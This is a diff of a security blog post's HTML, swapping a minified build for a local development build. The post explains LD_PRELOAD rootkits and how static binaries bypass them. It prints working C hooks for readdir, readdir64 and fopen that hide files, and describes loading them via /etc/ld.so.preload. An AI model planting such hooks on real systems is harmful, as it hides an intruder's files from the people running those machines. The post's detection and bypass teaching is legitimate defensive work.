@@ -1,50 +1,183 @@
-<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>Bypassing LD_PRELOAD Rootkits Is Easy · 0xMatheuZ</title><meta name=description content="Learn how to bypass LD_PRELOAD rootkits."><meta name=author content="0xMatheuZ"><meta name=keywords content="Rootkit"><link rel=canonical href=https://matheuzsecurity.github.io/hacking/bypass-userland-hooks/><meta property="og:title" content="Bypassing LD_PRELOAD Rootkits Is Easy · 0xMatheuZ"><meta property="og:description" content="Learn how to bypass LD_PRELOAD rootkits."><meta property="og:type" content="article"><meta property="og:url" content="https://matheuzsecurity.github.io/hacking/bypass-userland-hooks/"><meta name=twitter:card content="summary"><meta name=twitter:site content="@MatheuzSecurity"><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;1,400&display=swap" rel=stylesheet><link rel=stylesheet href=/css/main.min.1bc67ffb4441d0e85aecd23bda1eb9c0f69c871ef26d2a8dc539665adbf80152.css integrity="sha256-G8Z/+0RB0Oha7NI72h65wPachx7ybSqNxTlmWtv4AVI="><link rel=icon href=/img/0xm-badge.png><meta name=theme-color content="#06070b"></head><body id=top><header class=site-head><div class=wrap><nav class=nav><span class=prompt><a href=/>matheuz</a>@0xm:~$</span>
-<a href=/>Home</a>
-<a href=/hacking>hacking</a>
-<a href=/tags>Tags</a>
-<a href=/search>Search</a></nav></div></header><main class=main><article class=article><div class=art-head><div class=crumbs><span class=prompt>$ cd</span>
-<a href=/>~</a><span class=sep>/</span><a href=https://matheuzsecurity.github.io/hacking/>Hacking</a></div><h1 class=art-title>Bypassing LD_PRELOAD Rootkits Is Easy</h1><p class=art-desc>Learn how to bypass LD_PRELOAD rootkits.</p><div class=art-meta><span>May 14, 2025</span><span class=sep>·</span><span>5 min read</span>
-<span class=sep>·</span><span>0xMatheuZ</span><span class=sep>·</span><span>Malware Bypass</span></div><div class=art-tags><a href=/tags/rootkit/>Rootkit</a></div></div><hr class=art-sep><div class=content><p><img src=https://i.imgur.com/JhWCyVT.png alt=imgur></p><h2 id=introduction>Introduction</h2><p>In this post, I&rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.</p><h2 id=ld_preload>LD_PRELOAD</h2><p><code>LD_PRELOAD</code> is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.</p><p>This technique allows you to &ldquo;hook&rdquo; functions from standard libraries, such as libc, without modifying the program binary, and is therefore widely used both for debugging and for offensive techniques such as user space rootkits.</p><p>When an ELF binary is executed, the dynamic linker resolves external function calls using structures like the Procedure Linkage Table (PLT) and Global Offset Table (GOT). By preloading a custom library via LD_PRELOAD, attackers can override functions like readdir() or fopen().</p><p>Example:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>LD_PRELOAD</span><span class=o>=</span>./rootkitresearchers.so ls
-</span></span></code></pre></div><blockquote><p>/etc/ld.so.preload</p></blockquote><p>Besides the environment variable, the /etc/ld.so.preload file can also be used to persistently load a library into all processes on the system (including root). This file is read before any environment variable.</p><h2 id=installing-and-hiding-directory-with-rootkit>Installing and Hiding Directory with Rootkit</h2><p>To demonstrate this, I&rsquo;ll use a simple LD_PRELOAD rootkit that hooks the <code>readdir</code>, <code>readdir64</code>, and <code>fopen</code> functions to change the behavior of file and directory listings. The code is shown below.</p><p><a href=https://github.com/MatheuZSecurity/Rootkit/blob/main/Ring3/hiding-directory/hide.c>Full source</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>dirent</span> <span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>orig_readdir</span><span class=p>)(</span><span class=n>DIR</span> <span class=o>*</span><span class=n>dirp</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>dirent</span> <span class=o>*</span><span class=nf>readdir</span><span class=p>(</span><span class=n>DIR</span> <span class=o>*</span><span class=n>dirp</span><span class=p>)</span>
-</span></span><span class=line><span class=cl><span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>orig_readdir</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>        <span class=n>orig_readdir</span> <span class=o>=</span> <span class=nf>dlsym</span><span class=p>(</span><span class=n>RTLD_NEXT</span><span class=p>,</span> <span class=s>&#34;readdir&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>dirent</span> <span class=o>*</span><span class=n>entry</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>((</span><span class=n>entry</span> <span class=o>=</span> <span class=nf>orig_readdir</span><span class=p>(</span><span class=n>dirp</span><span class=p>))</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nf>strcmp</span><span class=p>(</span><span class=n>entry</span><span class=o>-&gt;</span><span class=n>d_name</span><span class=p>,</span> <span class=n>HIDDEN_DIR</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=nf>strcmp</span><span class=p>(</span><span class=n>entry</span><span class=o>-&gt;</span><span class=n>d_name</span><span class=p>,</span> <span class=n>HIDDEN_FILE</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>entry</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>        <span class=p>}</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span></code></pre></div><p>This snippet above hooks into the readdir function, which is responsible for listing files in a directory. It uses a pointer orig_readdir to store the address of the original function, retrieved with dlsym(RTLD_NEXT, &ldquo;readdir&rdquo;). Then, in a loop, it calls the original function to get each entry in the directory, but filters out (ignores) entries whose name is equal to &ldquo;secret&rdquo; or &ldquo;ld.so.preload&rdquo;. Thus, these entries never appear to the program that called readdir. When there are no more visible entries, it returns NULL.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>dirent64</span> <span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>orig_readdir64</span><span class=p>)(</span><span class=n>DIR</span> <span class=o>*</span><span class=n>dirp</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>dirent64</span> <span class=o>*</span><span class=nf>readdir64</span><span class=p>(</span><span class=n>DIR</span> <span class=o>*</span><span class=n>dirp</span><span class=p>)</span>
-</span></span><span class=line><span class=cl><span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>orig_readdir64</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>        <span class=n>orig_readdir64</span> <span class=o>=</span> <span class=nf>dlsym</span><span class=p>(</span><span class=n>RTLD_NEXT</span><span class=p>,</span> <span class=s>&#34;readdir64&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>dirent64</span> <span class=o>*</span><span class=n>entry</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>((</span><span class=n>entry</span> <span class=o>=</span> <span class=nf>orig_readdir64</span><span class=p>(</span><span class=n>dirp</span><span class=p>))</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nf>strcmp</span><span class=p>(</span><span class=n>entry</span><span class=o>-&gt;</span><span class=n>d_name</span><span class=p>,</span> <span class=n>HIDDEN_DIR</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=nf>strcmp</span><span class=p>(</span><span class=n>entry</span><span class=o>-&gt;</span><span class=n>d_name</span><span class=p>,</span> <span class=n>HIDDEN_FILE</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>entry</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>        <span class=p>}</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span></code></pre></div><p>This is the same logic but for the 64-bit version readdir64.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>FILE</span> <span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>orig_fopen</span><span class=p>)(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>pathname</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>mode</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=n>FILE</span> <span class=o>*</span><span class=nf>fopen</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>pathname</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>mode</span><span class=p>)</span>
-</span></span><span class=line><span class=cl><span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>orig_fopen</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>        <span class=n>orig_fopen</span> <span class=o>=</span> <span class=nf>dlsym</span><span class=p>(</span><span class=n>RTLD_NEXT</span><span class=p>,</span> <span class=s>&#34;fopen&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>strstr</span><span class=p>(</span><span class=n>pathname</span><span class=p>,</span> <span class=n>HIDDEN_FILE</span><span class=p>)</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>        <span class=n>errno</span> <span class=o>=</span> <span class=n>ENOENT</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nf>orig_fopen</span><span class=p>(</span><span class=n>pathname</span><span class=p>,</span> <span class=n>mode</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span></code></pre></div><p>This fopen hook hides access to specific files by returning a ‘file not found’ error (ENOENT) if the path contains keywords like ‘ld.so.preload’.</p><p>Now let&rsquo;s compile and load it into <code>/etc/ld.so.preload</code></p><p><img src=https://i.imgur.com/9Id2UUt.png alt=imgur></p><p>Once loaded, we can test creating a directory named <code>secret</code>, and see if it is hidden from ls.</p><p><img src=https://i.imgur.com/NAUR8Nl.png alt=imgur></p><p><img src=https://i.imgur.com/inkluye.png alt=imgur></p><p>As expected, it was hidden from ls.</p><h2 id=theory-breaking-ld_preload-rootkits>[Theory] Breaking LD_PRELOAD rootkits</h2><p>Here’s something interesting: rootkits that use the LD_PRELOAD technique depend ENTIRELY on the Linux dynamic loader (ld-linux.so) to &ldquo;inject&rdquo; their malicious libraries before the standard system libraries, such as libc. But does this work with all programs?</p><p>The short and quick answer is: No!</p><blockquote><p>Why does LD_PRELOAD work, and why does it sometimes not work?</p></blockquote><p>LD_PRELOAD, as explained in previous topics, is an environment variable used by ld-linux.so to load extra libraries before others, which allows it to intercept functions from standard libraries (such as libc). In other words, you can replace system functions, such as those that list files or open files, with customized versions, which is perfect for hiding directories or files, for example.</p><p>But for this to work, the program has to use dynamic loading and depend on ld-linux.so to resolve these functions.</p><blockquote><p>Why do static binaries break this idea?</p></blockquote><p>Statically linked binaries are &ldquo;self-contained&rdquo;. They incorporate all necessary code from their dependencies (such as libc) directly into the executable. As a result, they do not invoke the dynamic linker at runtime, so LD_PRELOAD and /etc/ld.so.preload are ignored.</p><p>In other words, LD_PRELOAD and the /etc/ld.so.preload file are simply not used by these binaries. This means that rootkits based on these techniques have no effect on them, practically useless.</p><p>This is one of the most effective ways to bypass these rootkits.</p><h2 id=practice-breaking-ld_preload-rootkits>[Practice] Breaking LD_PRELOAD rootkits</h2><p>With the rootkit loaded in /etc/ld.so.preload, the secret directory is hidden from commands like ls, which depend on libc and the dynamic loader.</p><p>But it is easy to bypass this, for example: just compile a static binary, like a simple <a href=https://raw.githubusercontent.com/finallyjustice/sample/refs/heads/master/c/getdents64.c>getdents64.c</a></p><blockquote><p>gcc getdents64.c -o getdents64 &ndash;static</p></blockquote><p>When using ldd getdents64, we will see that it does not load any dynamic dependencies, unlike ldd /bin/ls, which depends on libc. Since static binaries do not use the dynamic linker, LD_PRELOAD is completely ignored, and so is the rootkit.</p><p><img src=https://i.imgur.com/fv0N05S.png alt=imgur></p><p>Bypassing LD_PRELOAD rootkits is simply very easy.</p><h2 id=conclusion>Conclusion</h2><p>LD_PRELOAD rootkits are actually very good at hiding artifacts in user space, especially because of their simplicity and the fact that they are more stable than LKM rootkits. However, as we have shown in this post, they are not infallible. Simple techniques, such as the use of static binaries, can easily bypass the hooks applied by the rootkit, precisely because they do not depend on the dynamic loader and the external libc.</p><p>If you enjoyed this content and want to discuss similar techniques, feel free to join our Discord community. See you next time!</p><blockquote><p>Rootkit Researchers</p></blockquote><blockquote><p><a href=https://discord.gg/66N5ZQppU7>https://discord.gg/66N5ZQppU7</a></p></blockquote></div><footer class=art-foot><nav class=navlinks><a class=prev href=/hacking/gcc/><span class=label>&lt;&lt; prev</span><br>ElfDoor-gcc</a><a class=next href=/hacking/using-io-uring-to-break-linux-rootkits-hooks/><span class=label>next >></span><br>breaking ld_preload rootkit hooks</a></nav></footer></article></main><footer class=foot><span>&copy; 2026 <a href=/>0xMatheuZ</a></span>
-<span>built with <a href=https://gohugo.io/ target=_blank rel=noopener>hugo</a> · handcrafted layouts</span></footer><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode,s=n.parentNode,t=document.createElement("button");t.className="copy-code",t.type="button",t.textContent="copy";const i=()=>{t.textContent="copied",setTimeout(()=>t.textContent="copy",1600)};t.addEventListener("click",()=>{navigator.clipboard.writeText(e.textContent).then(i).catch(()=>{})});const o=s.classList.contains("highlight")?s:n;o.style.position="relative",o.appendChild(t)})</script></body></html>
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="index, follow">
+
+<title>Bypassing LD_PRELOAD Rootkits Is Easy · 0xMatheuZ</title>
+<meta name="description" content="Learn how to bypass LD_PRELOAD rootkits.">
+<meta name="author" content="0xMatheuZ"><meta name="keywords" content="Rootkit">
+<link rel="canonical" href="http://localhost:1313/hacking/bypass-userland-hooks/">
+<meta property="og:title" content="Bypassing LD_PRELOAD Rootkits Is Easy · 0xMatheuZ">
+<meta property="og:description" content="Learn how to bypass LD_PRELOAD rootkits.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="http://localhost:1313/hacking/bypass-userland-hooks/">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:site" content="@MatheuzSecurity">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;1,400&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/main.min.1bc67ffb4441d0e85aecd23bda1eb9c0f69c871ef26d2a8dc539665adbf80152.css" integrity="sha256-G8Z/&#43;0RB0Oha7NI72h65wPachx7ybSqNxTlmWtv4AVI=">
+<link rel="icon" href="/img/0xm-badge.png">
+<meta name="theme-color" content="#06070b">
+</head>
+<body id="top"><header class="site-head">
+  <div class="wrap">
+    <nav class="nav">
+      <span class="prompt"><a href="/">matheuz</a>@0xm:~$</span>
+      <a href="/">Home</a>
+      <a href="/hacking">hacking</a>
+      <a href="/tags">Tags</a>
+      <a href="/search">Search</a>
+    </nav>
+  </div>
+</header>
+<main class="main">
+
+<article class="article">
+  <div class="art-head">
+    <div class="crumbs">
+    <span class="prompt">$ cd</span>
+    <a href="/">~</a><span class="sep">/</span><a href="http://localhost:1313/hacking/">Hacking</a></div>
+
+    <h1 class="art-title">Bypassing LD_PRELOAD Rootkits Is Easy</h1><p class="art-desc">Learn how to bypass LD_PRELOAD rootkits.</p>
+    <div class="art-meta">
+      <span>May 14, 2025</span><span class="sep">·</span><span>5 min read</span>
+      <span class="sep">·</span><span>0xMatheuZ</span><span class="sep">·</span><span>Malware Bypass</span>
+    </div>
+    <div class="art-tags"><a href="/tags/rootkit/">Rootkit</a>
+    </div>
+  </div>
+
+  <hr class="art-sep">
+
+  <div class="content">
+    <p><img src="https://i.imgur.com/JhWCyVT.png" alt="imgur"></p>
+<h2 id="introduction">Introduction</h2>
+<p>In this post, I&rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.</p>
+<h2 id="ld_preload">LD_PRELOAD</h2>
+<p><code>LD_PRELOAD</code> is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.</p>
+<p>This technique allows you to &ldquo;hook&rdquo; functions from standard libraries, such as libc, without modifying the program binary, and is therefore widely used both for debugging and for offensive techniques such as user space rootkits.</p>
+<p>When an ELF binary is executed, the dynamic linker resolves external function calls using structures like the Procedure Linkage Table (PLT) and Global Offset Table (GOT). By preloading a custom library via LD_PRELOAD, attackers can override functions like readdir() or fopen().</p>
+<p>Example:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">LD_PRELOAD</span><span class="o">=</span>./rootkitresearchers.so ls
+</span></span></code></pre></div><blockquote>
+<p>/etc/ld.so.preload</p>
+</blockquote>
+<p>Besides the environment variable, the /etc/ld.so.preload file can also be used to persistently load a library into all processes on the system (including root). This file is read before any environment variable.</p>
+<h2 id="installing-and-hiding-directory-with-rootkit">Installing and Hiding Directory with Rootkit</h2>
+<p>To demonstrate this, I&rsquo;ll use a simple LD_PRELOAD rootkit that hooks the <code>readdir</code>, <code>readdir64</code>, and <code>fopen</code> functions to change the behavior of file and directory listings. The  code is shown below.</p>
+<p><a href="https://github.com/MatheuZSecurity/Rootkit/blob/main/Ring3/hiding-directory/hide.c">Full source</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">dirent</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">orig_readdir</span><span class="p">)(</span><span class="n">DIR</span> <span class="o">*</span><span class="n">dirp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">dirent</span> <span class="o">*</span><span class="nf">readdir</span><span class="p">(</span><span class="n">DIR</span> <span class="o">*</span><span class="n">dirp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">orig_readdir</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">orig_readdir</span> <span class="o">=</span> <span class="nf">dlsym</span><span class="p">(</span><span class="n">RTLD_NEXT</span><span class="p">,</span> <span class="s">&#34;readdir&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">dirent</span> <span class="o">*</span><span class="n">entry</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">((</span><span class="n">entry</span> <span class="o">=</span> <span class="nf">orig_readdir</span><span class="p">(</span><span class="n">dirp</span><span class="p">))</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">entry</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">,</span> <span class="n">HIDDEN_DIR</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nf">strcmp</span><span class="p">(</span><span class="n">entry</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">,</span> <span class="n">HIDDEN_FILE</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">entry</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>This snippet above hooks into the readdir function, which is responsible for listing files in a directory. It uses a pointer orig_readdir to store the address of the original function, retrieved with dlsym(RTLD_NEXT, &ldquo;readdir&rdquo;). Then, in a loop, it calls the original function to get each entry in the directory, but filters out (ignores) entries whose name is equal to &ldquo;secret&rdquo; or &ldquo;ld.so.preload&rdquo;. Thus, these entries never appear to the program that called readdir. When there are no more visible entries, it returns NULL.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">dirent64</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">orig_readdir64</span><span class="p">)(</span><span class="n">DIR</span> <span class="o">*</span><span class="n">dirp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">dirent64</span> <span class="o">*</span><span class="nf">readdir64</span><span class="p">(</span><span class="n">DIR</span> <span class="o">*</span><span class="n">dirp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">orig_readdir64</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">orig_readdir64</span> <span class="o">=</span> <span class="nf">dlsym</span><span class="p">(</span><span class="n">RTLD_NEXT</span><span class="p">,</span> <span class="s">&#34;readdir64&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">dirent64</span> <span class="o">*</span><span class="n">entry</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">((</span><span class="n">entry</span> <span class="o">=</span> <span class="nf">orig_readdir64</span><span class="p">(</span><span class="n">dirp</span><span class="p">))</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">entry</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">,</span> <span class="n">HIDDEN_DIR</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nf">strcmp</span><span class="p">(</span><span class="n">entry</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">,</span> <span class="n">HIDDEN_FILE</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">entry</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>This is the same logic but for the 64-bit version readdir64.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">FILE</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">orig_fopen</span><span class="p">)(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">pathname</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">mode</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">FILE</span> <span class="o">*</span><span class="nf">fopen</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">pathname</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">mode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">orig_fopen</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">orig_fopen</span> <span class="o">=</span> <span class="nf">dlsym</span><span class="p">(</span><span class="n">RTLD_NEXT</span><span class="p">,</span> <span class="s">&#34;fopen&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">strstr</span><span class="p">(</span><span class="n">pathname</span><span class="p">,</span> <span class="n">HIDDEN_FILE</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">errno</span> <span class="o">=</span> <span class="n">ENOENT</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">orig_fopen</span><span class="p">(</span><span class="n">pathname</span><span class="p">,</span> <span class="n">mode</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>This fopen hook hides access to specific files by returning a ‘file not found’ error (ENOENT) if the path contains keywords like ‘ld.so.preload’.</p>
+<p>Now let&rsquo;s compile and load it into <code>/etc/ld.so.preload</code></p>
+<p><img src="https://i.imgur.com/9Id2UUt.png" alt="imgur"></p>
+<p>Once loaded, we can test creating a directory named <code>secret</code>, and see if it is hidden from ls.</p>
+<p><img src="https://i.imgur.com/NAUR8Nl.png" alt="imgur"></p>
+<p><img src="https://i.imgur.com/inkluye.png" alt="imgur"></p>
+<p>As expected, it was hidden from ls.</p>
+<h2 id="theory-breaking-ld_preload-rootkits">[Theory] Breaking LD_PRELOAD rootkits</h2>
+<p>Here’s something interesting: rootkits that use the LD_PRELOAD technique depend ENTIRELY on the Linux dynamic loader (ld-linux.so) to &ldquo;inject&rdquo; their malicious libraries before the standard system libraries, such as libc. But does this work with all programs?</p>
+<p>The short and quick answer is: No!</p>
+<blockquote>
+<p>Why does LD_PRELOAD work, and why does it sometimes not work?</p>
+</blockquote>
+<p>LD_PRELOAD, as explained in previous topics, is an environment variable used by ld-linux.so to load extra libraries before others, which allows it to intercept functions from standard libraries (such as libc). In other words, you can replace system functions, such as those that list files or open files, with customized versions, which is perfect for hiding directories or files, for example.</p>
+<p>But for this to work, the program has to use dynamic loading and depend on ld-linux.so to resolve these functions.</p>
+<blockquote>
+<p>Why do static binaries break this idea?</p>
+</blockquote>
+<p>Statically linked binaries are &ldquo;self-contained&rdquo;. They incorporate all necessary code from their dependencies (such as libc) directly into the executable. As a result, they do not invoke the dynamic linker at runtime, so LD_PRELOAD and /etc/ld.so.preload are ignored.</p>
+<p>In other words, LD_PRELOAD and the /etc/ld.so.preload file are simply not used by these binaries. This means that rootkits based on these techniques have no effect on them, practically useless.</p>
+<p>This is one of the most effective ways to bypass these rootkits.</p>
+<h2 id="practice-breaking-ld_preload-rootkits">[Practice] Breaking LD_PRELOAD rootkits</h2>
+<p>With the rootkit loaded in /etc/ld.so.preload, the secret directory is hidden from commands like ls, which depend on libc and the dynamic loader.</p>
+<p>But it is easy to bypass this, for example: just compile a static binary, like a simple <a href="https://raw.githubusercontent.com/finallyjustice/sample/refs/heads/master/c/getdents64.c">getdents64.c</a></p>
+<blockquote>
+<p>gcc getdents64.c -o getdents64 &ndash;static</p>
+</blockquote>
+<p>When using ldd getdents64, we will see that it does not load any dynamic dependencies, unlike ldd /bin/ls, which depends on libc. Since static binaries do not use the dynamic linker, LD_PRELOAD is completely ignored, and so is the rootkit.</p>
+<p><img src="https://i.imgur.com/fv0N05S.png" alt="imgur"></p>
+<p>Bypassing LD_PRELOAD rootkits is simply very easy.</p>
+<h2 id="conclusion">Conclusion</h2>
